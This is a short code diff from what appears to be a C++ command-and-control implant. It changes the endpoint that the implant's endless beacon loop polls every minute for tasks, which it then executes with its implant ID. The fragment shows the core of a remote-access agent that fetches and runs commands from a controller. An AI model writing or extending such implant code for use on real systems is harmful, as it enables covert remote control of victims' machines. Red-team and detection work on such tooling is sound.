@@ -67,7 +67,8 @@ Expected Check in: When should you expect to see the agent again?
 void IWillRunForever(void){
     while(true){
         /* THIS IS GETTING US COMMANDS EVERY MINUTE */
-        std::string new_item = HttpGetCommand("/get_commands", IMPLANT_ID);
+        std::string new_item = HttpGetCommand("/get_qcommands", IMPLANT_ID);
+        
         json converted_new_item = json::parse(new_item);
         int num_of_tasks = converted_new_item.size();
         for(int i = 0; i < num_of_tasks; i++){
@@ -76,7 +77,6 @@ void IWillRunForever(void){
             std::string args = converted_new_item.at(i).at(3);
             execute(command, args, converted_new_item.at(i).at(0), IMPLANT_ID);
         }
-            
         Sleep(60000);
     }
 }
